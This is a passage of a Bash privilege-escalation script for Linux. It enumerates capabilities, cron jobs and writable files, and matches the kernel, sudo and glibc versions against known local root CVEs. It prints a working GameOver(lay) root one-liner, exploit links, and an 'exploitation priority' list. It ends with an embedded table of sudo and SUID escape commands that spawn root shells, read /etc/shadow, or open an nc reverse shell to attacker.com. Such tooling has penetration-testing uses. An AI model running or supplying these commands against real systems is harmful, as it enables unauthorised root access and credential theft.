    local output_file="$OUTPUT_DIR/recon/capabilities.txt"

    echo "--- Capabilities ---" >"$output_file"

    # Check if getcap is available
    if ! command -v getcap >/dev/null 2>&1; then
        echo "[-] getcap binary not found" >>"$output_file"
        log_message "WARN" "getcap binary not found"
        return 1
    fi

    # Find files with capabilities
    echo "[*] Searching for files with capabilities (this may take a while)..." >>"$output_file"
    cap_files=$(getcap -r / 2>/dev/null)

    if [ -n "$cap_files" ]; then
        echo "$cap_files" >>"$output_file"

        # Check for dangerous capabilities
        echo -e "\n--- Dangerous Capabilities ---" >>"$output_file"
        echo "$cap_files" | grep -E "cap_(setuid|setgid|net_raw|net_admin|sys_admin|sys_ptrace)" >>"$output_file" || echo "No dangerous capabilities found" >>"$output_file"
    else
        echo "[-] No files with capabilities found" >>"$output_file"
    fi

    log_message "INFOS" "Capabilities check saved to $output_file"
    return 0
}

recon_cron_jobs() {
    log_message "INFOS" "Checking for cron jobs"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/cron_jobs.txt"

    echo "--- Cron Jobs ---" >"$output_file"

    # System-wide cron jobs
    echo "[*] System-wide cron jobs:" >>"$output_file"
    ls -la /etc/cron* 2>/dev/null >>"$output_file"

    # crontab entries
    echo -e "\n[*] Crontab content:" >>"$output_file"
    cat /etc/crontab 2>/dev/null >>"$output_file"

    # User cron jobs
    if [ -d "/var/spool/cron/crontabs" ]; then
        echo -e "\n[*] User crontabs:" >>"$output_file"
        ls -la /var/spool/cron/crontabs 2>/dev/null >>"$output_file"
    fi

    # Check for writable cron job scripts
    echo -e "\n--- Writable Cron Scripts ---" >>"$output_file"
    cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -E "[0-9]+ [0-9]+ [0-9]+ [0-9]+ [0-9]+" | while read -r cron_line; do
        cmd=$(echo "$cron_line" | awk '{for(i=6;i<=NF;i++) print $i}' | tr ' ' ' ')
        script_path=$(echo "$cmd" | awk '{print $1}')
        if [ -f "$script_path" ] && [ -w "$script_path" ]; then
            echo "[+] Writable cron script found: $script_path" >>"$output_file"
        fi
    done

    log_message "INFOS" "Cron jobs check saved to $output_file"
    return 0
}

recon_writable_files() {
    log_message "INFOS" "Searching for interesting writable files"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/writable_files.txt"

    echo "--- Writable Files Recon Report ---" >"$output_file"
    echo "Generated on: $(date)" >> "$output_file"
    echo "Running as user: $(whoami)" >> "$output_file"
    echo "" >> "$output_file"
    echo "[*] Note: Running as non-root user, some directories may not be accessible" >> "$output_file"
    echo "" >> "$output_file"

    # This is a long operation - warn the user
    long_operation_warning "writable files search"

    # Search for files writable by current user (ENHANCED)
    echo "[*] Searching for files writable by current user..." >>"$output_file"
    find / -type f -writable 2>/dev/null | grep -v -E "^/(proc|sys|dev|run)" | head -50 >> "$output_file"
    echo "" >> "$output_file"
    
    # Find world-writable files (ENHANCED - increased limit and better filtering)
    echo "[*] World-writable files (excluding common temp locations)..." >>"$output_file"
    find / -type f -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >> "$output_file"
    echo "" >> "$output_file"
    
    # Find world-writable directories (ENHANCED - better description and filtering)
    echo "[*] World-writable directories (excluding common temp locations)..." >>"$output_file"
    find / -type d -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >> "$output_file"
    echo "" >> "$output_file"

    # Check specific interesting locations (ENHANCED)
    echo "[*] Checking user-accessible configuration areas..." >>"$output_file"
    
    # Check home directory configurations
    if [ -w "$HOME" ]; then
        echo "[+] Home directory is writable: $HOME" >> "$output_file"
    fi
    
    # Check for writable files in common configuration directories (NEW)
    local config_dirs=("/etc" "/var/www" "/opt" "/usr/local" "/home")
    for dir in "${config_dirs[@]}"; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "[+] Writable configuration directory: $dir" >> "$output_file"
        fi
    done
    echo "" >> "$output_file"
    
    # Check for writable files in PATH (ENHANCED)
    echo "[*] Checking for writable files in PATH..." >>"$output_file"
    echo "$PATH" | tr ':' '\n' | while read -r path_dir; do
        if [ -d "$path_dir" ] && [ -w "$path_dir" ]; then
            echo "[+] Writable directory in PATH: $path_dir" >> "$output_file"
            # List writable files in this PATH directory (NEW)
            find "$path_dir" -maxdepth 1 -type f -writable 2>/dev/null | while read -r file; do
                echo "    Writable file: $file" >> "$output_file"
            done
        fi
    done
    echo "" >> "$output_file"

    # Check for writable configuration files (ENHANCED)
    echo "[*] Checking for writable configuration files..." >>"$output_file"
    config_files="/etc/passwd /etc/shadow /etc/sudoers /etc/hosts /etc/crontab"
    for config in $config_files; do
        if [ -f "$config" ] && [ -w "$config" ]; then
            echo "[+] CRITICAL: Writable system config file: $config" >> "$output_file"
        fi
    done
    echo "" >> "$output_file"

    # Check for writable cron files (NEW)
    echo "[*] Checking for writable cron files..." >> "$output_file"
    find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null | while read -r file; do
        echo "[+] Writable cron file: $file" >> "$output_file"
    done
    echo "" >> "$output_file"

    # Check for writable systemd service files (NEW)
    echo "[*] Checking for writable systemd service files..." >> "$output_file"
    find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null | while read -r file; do
        echo "[+] Writable service file: $file" >> "$output_file"
    done
    echo "" >> "$output_file"

    # Check for writable startup files (NEW)
    echo "[*] Checking for writable startup files..." >> "$output_file"
    startup_files="/etc/rc.local /etc/init.d/* /etc/profile /etc/bash.bashrc"
    for startup_file in $startup_files; do
        if [ -f "$startup_file" ] && [ -w "$startup_file" ]; then
            echo "[+] Writable startup file: $startup_file" >> "$output_file"
        fi
    done
    echo "" >> "$output_file"

    # Check for writable log files (NEW)
    echo "[*] Checking for writable log files..." >> "$output_file"
    find /var/log -type f -writable 2>/dev/null | head -20 | while read -r file; do
        echo "[+] Writable log file: $file" >> "$output_file"
    done
    echo "" >> "$output_file"

    # Check for writable web directories (NEW)
    echo "[*] Checking for writable web directories..." >> "$output_file"
    web_dirs="/var/www /srv/www /opt/lampp/htdocs /var/www/html"
    for web_dir in $web_dirs; do
        if [ -d "$web_dir" ] && [ -w "$web_dir" ]; then
            echo "[+] Writable web directory: $web_dir" >> "$output_file"
        fi
    done
    echo "" >> "$output_file"

    # Check for writable database files (NEW)
    echo "[*] Checking for writable database files..." >> "$output_file"
    find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read -r db_file; do
        if [ -w "$db_file" ]; then
            echo "[+] Writable database file: $db_file" >> "$output_file"
        fi
    done | head -20
    echo "" >> "$output_file"

    # Check for writable SSH files (NEW)
    echo "[*] Checking for writable SSH files..." >> "$output_file"
    ssh_dirs="/etc/ssh /home/*/.ssh /root/.ssh"
    for ssh_dir in $ssh_dirs; do
        if [ -d "$ssh_dir" ] && [ -w "$ssh_dir" ]; then
            echo "[+] Writable SSH directory: $ssh_dir" >> "$output_file"
            # Check for specific SSH files
            for ssh_file in "$ssh_dir/authorized_keys" "$ssh_file/id_rsa" "$ssh_dir/config"; do
                if [ -f "$ssh_file" ] && [ -w "$ssh_file" ]; then
                    echo "    Writable SSH file: $ssh_file" >> "$output_file"
                fi
            done
        fi
    done
    echo "" >> "$output_file"

    # Add summary section (NEW)
    echo "--- Recon Summary ---" >> "$output_file"
    total_writable_files=$(grep -c "Writable file:" "$output_file" || echo "0")
    total_writable_dirs=$(grep -c "Writable directory:" "$output_file" || echo "0")
    interesting_locations=$(grep -c "^\[+\]" "$output_file" || echo "0")
    
    echo "Total writable files found: $total_writable_files" >> "$output_file"
    echo "Total writable directories found: $total_writable_dirs" >> "$output_file"
    echo "Interesting writable locations: $interesting_locations" >> "$output_file"
    echo "" >> "$output_file"

    # Add exploitation guidance (NEW)
    if [ "$interesting_locations" -gt 0 ]; then
        echo "--- Exploitation Guidance ---" >> "$output_file"
        echo "Writable files can be exploited in several ways:" >> "$output_file"
        echo "1. Cron files: Modify to execute commands when cron runs" >> "$output_file"
        echo "2. Service files: Modify to execute commands when service starts/restarts" >> "$output_file"
        echo "3. Startup files: Modify to execute commands at system/user startup" >> "$output_file"
        echo "4. PATH directories: Place malicious binaries with common names" >> "$output_file"
        echo "5. Config files: Modify to change system behavior or gain access" >> "$output_file"
        echo "6. SSH files: Add keys for persistent access" >> "$output_file"
        echo "7. Web directories: Upload web shells or malicious content" >> "$output_file"
        echo "" >> "$output_file"
    fi

    log_message "INFOS" "Writable files check saved to $output_file"
    return 0
}

recon_kernel_exploits() {
    log_message "INFOS" "Checking for potential kernel exploits"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/kernel_exploits.txt"

    echo "--- Kernel Exploit Analysis ---" >"$output_file"
    echo "Generated on: $(date)" >> "$output_file"
    echo "Running as user: $(whoami)" >> "$output_file"
    echo "" >> "$output_file"

    # Get comprehensive kernel information
    kernel_version=$(uname -r)
    kernel_release=$(uname -v)
    architecture=$(uname -m)
    os_version=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
    
    echo "--- System Information ---" >>"$output_file"
    echo "Kernel Version: $kernel_version" >>"$output_file"
    echo "Kernel Release: $kernel_release" >>"$output_file"
    echo "Architecture: $architecture" >>"$output_file"
    echo "OS Version: $os_version" >>"$output_file"
    echo "" >>"$output_file"

    # Extract version numbers for comparison
    kernel_major=$(echo "$kernel_version" | cut -d. -f1)
    kernel_minor=$(echo "$kernel_version" | cut -d. -f2)
    kernel_patch=$(echo "$kernel_version" | cut -d. -f3 | cut -d- -f1)
    
    echo "--- Kernel Version Breakdown ---" >>"$output_file"
    echo "Major: $kernel_major" >>"$output_file"
    echo "Minor: $kernel_minor" >>"$output_file"
    echo "Patch: $kernel_patch" >>"$output_file"
    echo "" >>"$output_file"

    # Initialize vulnerability tracking arrays
    vuln_count=0
    declare -a found_vulns=()
    declare -a vuln_details=()

    # Function to compare kernel versions
    version_compare() {
        local current_major=$1
        local current_minor=$2
        local current_patch=$3
        local vuln_major=$4
        local vuln_minor=$5
        local vuln_patch=$6
        
        # Convert to comparable numbers
        local current_num=$((current_major * 10000 + current_minor * 100 + current_patch))
        local vuln_num=$((vuln_major * 10000 + vuln_minor * 100 + vuln_patch))
        
        if [ "$current_num" -le "$vuln_num" ]; then
            return 0  # Vulnerable
        else
            return 1  # Not vulnerable
        fi
    }

    # Function to add vulnerability to tracking arrays
    add_vulnerability() {
        local vuln_name="$1"
        local vuln_detail="$2"
        found_vulns+=("$vuln_name")
        vuln_details+=("$vuln_detail")
        vuln_count=$((vuln_count + 1))
    }

    echo "--- Known Kernel Vulnerabilities ---" >>"$output_file"

    # Dirty COW (CVE-2016-5195) - Expanded check
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 8 3; then
        if [[ "$kernel_version" =~ ^2\.6\. ]] || [[ "$kernel_version" =~ ^3\. ]] || ([[ "$kernel_version" =~ ^4\. ]] && [[ "${kernel_patch}" -lt "9" ]]); then
            echo "[+] CRITICAL: Potentially vulnerable to Dirty COW (CVE-2016-5195)" >>"$output_file"
            echo "    Affected: Linux kernel 2.6.22 - 4.8.3" >>"$output_file"
            echo "    Impact: Local privilege escalation via copy-on-write" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://dirtycow.ninja/" >>"$output_file"
            echo "    PoC: https://github.com/FireFart/dirtycow/blob/master/dirty.c" >>"$output_file"
            echo "    Test: echo 'this is not a test' > /tmp/foo && cp /etc/passwd /tmp/passwd.bak" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "Dirty COW (CVE-2016-5195)" "CRITICAL - Local privilege escalation via copy-on-write"
        fi
    fi

    # KASLR/SMEP Bypass (CVE-2017-5123) - waitid() 
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 14 0; then
        echo "[+] HIGH: Potentially vulnerable to waitid() KASLR/SMEP bypass (CVE-2017-5123)" >>"$output_file"
        echo "    Affected: Linux kernel < 4.14" >>"$output_file"
        echo "    Impact: Local privilege escalation via waitid() system call" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/nongiach/CVE/tree/master/CVE-2017-5123" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "waitid() KASLR/SMEP bypass (CVE-2017-5123)" "HIGH - Local privilege escalation via waitid() system call"
    fi

    # Stack Clash (CVE-2017-1000364)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 11 9; then
        echo "[+] HIGH: Potentially vulnerable to Stack Clash (CVE-2017-1000364)" >>"$output_file"
        echo "    Affected: Linux kernel < 4.11.9" >>"$output_file"
        echo "    Impact: Local privilege escalation via stack exhaustion" >>"$output_file"
        echo "    CVSS Score: 7.4 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/stack_clash.rb" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "Stack Clash (CVE-2017-1000364)" "HIGH - Local privilege escalation via stack exhaustion"
    fi

    # DCCP Double-Free (CVE-2017-6074)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 9 11; then
        echo "[+] CRITICAL: Potentially vulnerable to DCCP Double-Free (CVE-2017-6074)" >>"$output_file"
        echo "    Affected: Linux kernel 2.6.18 - 4.9.11" >>"$output_file"
        echo "    Impact: Local privilege escalation via DCCP module" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074" >>"$output_file"
        echo "    Test: lsmod | grep dccp" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "DCCP Double-Free (CVE-2017-6074)" "CRITICAL - Local privilege escalation via DCCP module"
    fi

    # Netfilter Heap Overflow (CVE-2021-22555)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 12 0; then
        echo "[+] CRITICAL: Potentially vulnerable to Netfilter Heap Overflow (CVE-2021-22555)" >>"$output_file"
        echo "    Affected: Linux kernel 2.6.19 - 5.12.0" >>"$output_file"
        echo "    Impact: Local privilege escalation via netfilter" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "Netfilter Heap Overflow (CVE-2021-22555)" "CRITICAL - Local privilege escalation via netfilter"
    fi

    # eBPF Verifier (CVE-2021-3490, CVE-2021-3489, CVE-2021-3491)
    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -le 12 ]]; then
        echo "[+] HIGH: Potentially vulnerable to eBPF Verifier vulnerabilities (CVE-2021-3490/3489/3491)" >>"$output_file"
        echo "    Affected: Linux kernel 5.7 - 5.12" >>"$output_file"
        echo "    Impact: Local privilege escalation via eBPF verifier" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" >>"$output_file"
        echo "    Test: /proc/sys/kernel/unprivileged_bpf_disabled" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "eBPF Verifier (CVE-2021-3490/3489/3491)" "HIGH - Local privilege escalation via eBPF verifier"
    fi

    # PwnKit - Polkit pkexec (CVE-2021-4034)
    echo "--- Checking for PwnKit (CVE-2021-4034) ---" >>"$output_file"
    if [ -f "/usr/bin/pkexec" ]; then
        if [ -u "/usr/bin/pkexec" ]; then
            echo "[+] CRITICAL: pkexec binary found with SUID bit - PwnKit vulnerable!" >>"$output_file"
            echo "    Binary: /usr/bin/pkexec" >>"$output_file"
            echo "    Impact: Local privilege escalation to root" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://github.com/berdav/CVE-2021-4034" >>"$output_file"
            echo "    Quick Test: ls -la /usr/bin/pkexec" >>"$output_file"
            ls -la /usr/bin/pkexec >>"$output_file" 2>/dev/null
            echo "" >>"$output_file"
            add_vulnerability "PwnKit (CVE-2021-4034)" "CRITICAL - Local privilege escalation to root via pkexec"
        else
            echo "[-] pkexec found but no SUID bit set" >>"$output_file"
        fi
    else
        echo "[-] pkexec not found on system" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Sudo Baron Samedit (CVE-2021-3156)
    echo "--- Checking for Sudo Baron Samedit (CVE-2021-3156) ---" >>"$output_file"
    if command -v sudo >/dev/null 2>&1; then
        sudo_version=$(sudo -V 2>/dev/null | head -n 1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        echo "Sudo Version: $sudo_version" >>"$output_file"
        
        if echo "$sudo_version" | grep -E "^1\.(8\.[0-9]|9\.[0-5])" >/dev/null; then
            echo "[+] CRITICAL: Potentially vulnerable to Sudo Baron Samedit (CVE-2021-3156)" >>"$output_file"
            echo "    Affected: sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1" >>"$output_file"
            echo "    Impact: Local privilege escalation via sudo heap overflow" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://github.com/blasty/CVE-2021-3156" >>"$output_file"
            echo "    Test: sudoedit -s /nonexistent" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "Sudo Baron Samedit (CVE-2021-3156)" "CRITICAL - Local privilege escalation via sudo heap overflow"
        else
            echo "[-] Sudo version appears to be patched" >>"$output_file"
        fi
    else
        echo "[-] sudo not found on system" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # DirtyPipe (CVE-2022-0847)
    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -ge 8 ]] && version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 16 11; then
        echo "[+] CRITICAL: Potentially vulnerable to DirtyPipe (CVE-2022-0847)" >>"$output_file"
        echo "    Affected: Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102" >>"$output_file"
        echo "    Impact: Local privilege escalation via pipe vulnerability" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" >>"$output_file"
        echo "    Test: Check for pipe functionality" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "DirtyPipe (CVE-2022-0847)" "CRITICAL - Local privilege escalation via pipe vulnerability"
    fi

    # GameOver(lay) - CVE-2023-2640 & CVE-2023-32629
    echo "--- Checking for GameOver(lay) Ubuntu Privilege Escalation ---" >>"$output_file"
    if grep -qi ubuntu /etc/os-release 2>/dev/null; then
        ubuntu_version=$(grep VERSION_ID /etc/os-release 2>/dev/null | cut -d'"' -f2)
        echo "Ubuntu Version: $ubuntu_version" >>"$output_file"
        
        # Check if it's a vulnerable Ubuntu version
        if [[ "$ubuntu_version" =~ ^(20\.04|22\.04|23\.04) ]]; then
            echo "[+] HIGH: Potentially vulnerable to GameOver(lay) Ubuntu exploit" >>"$output_file"
            echo "    CVE: CVE-2023-2640 & CVE-2023-32629" >>"$output_file"
            echo "    Affected: Ubuntu 20.04, 22.04, 23.04" >>"$output_file"
            echo "    Impact: Local privilege escalation via overlayfs" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"id\\\")'\""  >>"$output_file"
            echo "    Reference: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "GameOver(lay) (CVE-2023-2640 & CVE-2023-32629)" "HIGH - Local privilege escalation via overlayfs on Ubuntu"
        fi
    else
        echo "[-] Not running Ubuntu" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Looney Tunables (CVE-2023-4911)
    echo "--- Checking for Looney Tunables (CVE-2023-4911) ---" >>"$output_file"
    if [ -f "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" ] || [ -f "/lib64/ld-linux-x86-64.so.2" ]; then
        # Check glibc version
        glibc_version=$(ldd --version 2>/dev/null | head -n1 | grep -oE '[0-9]+\.[0-9]+')
        echo "GLIBC Version: $glibc_version" >>"$output_file"
        
        if [[ -n "$glibc_version" ]]; then
            # Vulnerable versions: glibc 2.34 to 2.38
            if [[ "$glibc_version" =~ ^2\.(3[4-8]) ]]; then
                echo "[+] CRITICAL: Potentially vulnerable to Looney Tunables (CVE-2023-4911)" >>"$output_file"
                echo "    Affected: glibc 2.34 - 2.38" >>"$output_file"
                echo "    Impact: Local privilege escalation via GLIBC_TUNABLES" >>"$output_file"
                echo "    CVSS Score: 7.8 (High)" >>"$output_file"
                echo "    Exploit: https://github.com/leesh3288/CVE-2023-4911" >>"$output_file"
                echo "    Test: env GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A /bin/true" >>"$output_file"
                echo "" >>"$output_file"
                add_vulnerability "Looney Tunables (CVE-2023-4911)" "CRITICAL - Local privilege escalation via GLIBC_TUNABLES"
            fi
        fi
    else
        echo "[-] Could not determine GLIBC version" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Additional checks for kernel configuration
    echo "--- Kernel Security Features Check ---" >>"$output_file"
    
    # Check KASLR
    if [ -f "/proc/sys/kernel/randomize_va_space" ]; then
        kaslr_status=$(cat /proc/sys/kernel/randomize_va_space)
        if [ "$kaslr_status" -eq 2 ]; then
            echo "[+] KASLR: Enabled (randomize_va_space = 2)" >>"$output_file"
        elif [ "$kaslr_status" -eq 1 ]; then
            echo "[!] KASLR: Partially enabled (randomize_va_space = 1)" >>"$output_file"
        else
            echo "[-] KASLR: Disabled (randomize_va_space = 0) - VULNERABLE" >>"$output_file"
            add_vulnerability "KASLR Disabled" "MEDIUM - Address space layout randomization disabled"
        fi
    fi
    
    # Check SMEP/SMAP
    if [ -f "/proc/cpuinfo" ]; then
        if grep -q smep /proc/cpuinfo; then
            echo "[+] SMEP: CPU supports SMEP" >>"$output_file"
        else
            echo "[-] SMEP: CPU does not support SMEP" >>"$output_file"
        fi
        
        if grep -q smap /proc/cpuinfo; then
            echo "[+] SMAP: CPU supports SMAP" >>"$output_file"
        else
            echo "[-] SMAP: CPU does not support SMAP" >>"$output_file"
        fi
    fi
    
    # Check NX bit
    if grep -q nx /proc/cpuinfo; then
        echo "[+] NX: CPU supports NX bit" >>"$output_file"
    else
        echo "[-] NX: CPU does not support NX bit" >>"$output_file"
    fi
    
    # Check for kptr_restrict
    if [ -f "/proc/sys/kernel/kptr_restrict" ]; then
        kptr_status=$(cat /proc/sys/kernel/kptr_restrict)
        if [ "$kptr_status" -eq 2 ]; then
            echo "[+] KPTR: Kernel pointers hidden from all users" >>"$output_file"
        elif [ "$kptr_status" -eq 1 ]; then
            echo "[!] KPTR: Kernel pointers hidden from non-root" >>"$output_file"
        else
            echo "[-] KPTR: Kernel pointers visible - potential info leak" >>"$output_file"
        fi
    fi
    
    # Check dmesg restrictions
    if [ -f "/proc/sys/kernel/dmesg_restrict" ]; then
        dmesg_status=$(cat /proc/sys/kernel/dmesg_restrict)
        if [ "$dmesg_status" -eq 1 ]; then
            echo "[+] DMESG: Restricted to privileged users" >>"$output_file"
        else
            echo "[-] DMESG: Accessible by unprivileged users" >>"$output_file"
        fi
    fi
    echo "" >>"$output_file"

    # Check for available exploit tools
    echo "--- Exploit Development Tools Check ---" >>"$output_file"
    exploit_tools=("gcc" "make" "python" "python3" "perl" "ruby" "nc" "ncat" "netcat")
    available_tools=""
    
    for tool in "${exploit_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            available_tools="$available_tools $tool"
        fi
    done
    
    if [ -n "$available_tools" ]; then
        echo "[+] Available development tools:$available_tools" >>"$output_file"
        echo "    These tools can be used to compile and run exploits" >>"$output_file"
    else
        echo "[-] No development tools found" >>"$output_file"
        echo "    This may limit exploit capabilities" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Generate summary and recommendations
    echo "===========================================" >>"$output_file"
    echo "           VULNERABILITY SUMMARY" >>"$output_file"
    echo "===========================================" >>"$output_file"
    echo "Total vulnerabilities found: $vuln_count" >>"$output_file"
    echo "" >>"$output_file"
    
    if [ "$vuln_count" -gt 0 ]; then
        echo "IDENTIFIED VULNERABILITIES:" >>"$output_file"
        echo "----------------------------" >>"$output_file"
        for i in "${!found_vulns[@]}"; do
            echo "$((i+1)). ${found_vulns[i]}" >>"$output_file"
            echo "   ${vuln_details[i]}" >>"$output_file"
            echo "" >>"$output_file"
        done
        
        echo "[!] SECURITY RECOMMENDATIONS:" >>"$output_file"
        echo "1. Update the kernel to the latest stable version" >>"$output_file"
        echo "2. Apply all available security patches" >>"$output_file"
        echo "3. Consider using a distribution with regular security updates" >>"$output_file"
        echo "4. Enable additional kernel hardening features if available" >>"$output_file"
        echo "" >>"$output_file"
        
        echo "[!] EXPLOITATION PRIORITY:" >>"$output_file"
        echo "1. Check PwnKit (CVE-2021-4034) first - often most reliable" >>"$output_file"
        echo "2. Try Sudo Baron Samedit (CVE-2021-3156) if sudo is available" >>"$output_file"
        echo "3. Attempt DirtyPipe (CVE-2022-0847) for newer kernels" >>"$output_file"
        echo "4. Consider Dirty COW (CVE-2016-5195) for older systems" >>"$output_file"
        echo "5. GameOver(lay) for Ubuntu systems" >>"$output_file"
        echo "6. Looney Tunables (CVE-2023-4911) for systems with vulnerable glibc" >>"$output_file"
    else
        echo "[+] No obvious kernel vulnerabilities detected" >>"$output_file"
        echo "    The system appears to have updated kernel security patches" >>"$output_file"
        echo "    Consider other privilege escalation vectors (SUID, sudo, etc.)" >>"$output_file"
    fi
    echo "===========================================" >>"$output_file"

    log_message "INFOS" "Kernel exploit analysis saved to $output_file"
    log_message "INFOS" "Found $vuln_count potential vulnerabilities"
    
    # Also print summary to console
    if [ "$vuln_count" -gt 0 ]; then
        echo "=== VULNERABILITY SUMMARY ==="
        for i in "${!found_vulns[@]}"; do
            echo "$((i+1)). ${found_vulns[i]}"
        done
        echo "Total: $vuln_count vulnerabilities found"
    else
        echo "No obvious vulnerabilities detected"
    fi
    
    return 0
}

# Initialize GTFOBins data (simplified version)
init_gtfobins() {
    log_message "INFOS" "Initializing GTFOBins data"

    # Create a temporary file with GTFOBins data
    mkdir -p "$(dirname "$GTFOBINS_DATA")"

    cat <<'EOF' >"$GTFOBINS_DATA"
# This is a simplified version of GTFOBins data
# Format: binary_name:type:exploit_command

# Sudo binaries
apt:sudo:sudo apt update -o APT::Update::Pre-Invoke=/bin/sh
apt-get:sudo:sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh
ash:sudo:sudo ash
awk:sudo:sudo awk 'BEGIN {system("/bin/sh")}'
bash:sudo:sudo bash
busybox:sudo:sudo busybox sh
cat:sudo:LFILE=/etc/shadow && sudo cat "$LFILE"
chmod:sudo:LFILE=/etc/shadow && sudo chmod 0777 $LFILE
chown:sudo:LFILE=/etc/shadow && sudo chown $(id -un):$(id -gn) $LFILE
cp:sudo:LFILE=/etc/shadow && TF=$(mktemp) && sudo cp $LFILE $TF && cat $TF
csh:sudo:sudo csh
curl:sudo:sudo curl file:///etc/shadow
dash:sudo:sudo dash
dd:sudo:LFILE=/etc/shadow && sudo dd if=$LFILE
env:sudo:sudo env /bin/sh
find:sudo:sudo find . -exec /bin/sh \; -quit
ftp:sudo:sudo ftp -c "!/bin/sh"
gdb:sudo:sudo gdb -nx -ex '!sh' -ex quit
git:sudo:sudo git -p help config
grep:sudo:LFILE=/etc/shadow && sudo grep . $LFILE
head:sudo:LFILE=/etc/shadow && sudo head -c1G $LFILE
less:sudo:sudo less /etc/profile && !/bin/sh
lua:sudo:sudo lua -e 'os.execute("/bin/sh")'
man:sudo:sudo man man && !/bin/sh
more:sudo:TERM= sudo more /etc/profile && !/bin/sh
mount:sudo:sudo mount -o bind /bin/sh /bin/mount && sudo mount
mv:sudo:LFILE=/etc/shadow && TF=$(mktemp) && sudo mv $LFILE $TF && cat $TF
nano:sudo:sudo nano && ^R^X && reset && ^X && echo "exec sh" > /tmp/nano.sh && chmod +x /tmp/nano.sh && sudo nano -s /tmp/nano.sh /etc/hosts
nc:sudo:RHOST=attacker.com && RPORT=12345 && sudo nc -e /bin/sh $RHOST $RPORT
nmap:sudo:TF=$(mktemp) && echo 'os.execute("/bin/sh")' > $TF && sudo nmap --script=$TF
perl:sudo:sudo perl -e 'exec "/bin/sh";'
php:sudo:sudo php -r "system('/bin/sh');"
python:sudo:sudo python -c 'import os; os.system("/bin/sh")'
python3:sudo:sudo python3 -c 'import os; os.system("/bin/sh")'
ruby:sudo:sudo ruby -e 'exec "/bin/sh"'
sed:sudo:sudo sed -n '1e exec sh 1>&0' /etc/hosts
sh:sudo:sudo sh
tar:sudo:sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
time:sudo:sudo time /bin/sh
vi:sudo:sudo vi -c ':!/bin/sh'
vim:sudo:sudo vim -c ':!/bin/sh'
zsh:sudo:sudo zsh

# SUID binaries
bash:suid:./bash -p
busybox:suid:./busybox sh
cp:suid:LFILE=/etc/shadow && TF=$(mktemp) && ./cp $LFILE $TF && cat $TF
curl:suid:./curl file:///etc/shadow
date:suid:LFILE=file_to_read && ./date -f $LFILE
env:suid:./env /bin/sh -p
find:suid:./find . -exec /bin/sh -p \; -quit
grep:suid:LFILE=/etc/shadow && ./grep '' $LFILE
less:suid:./less /etc/shadow
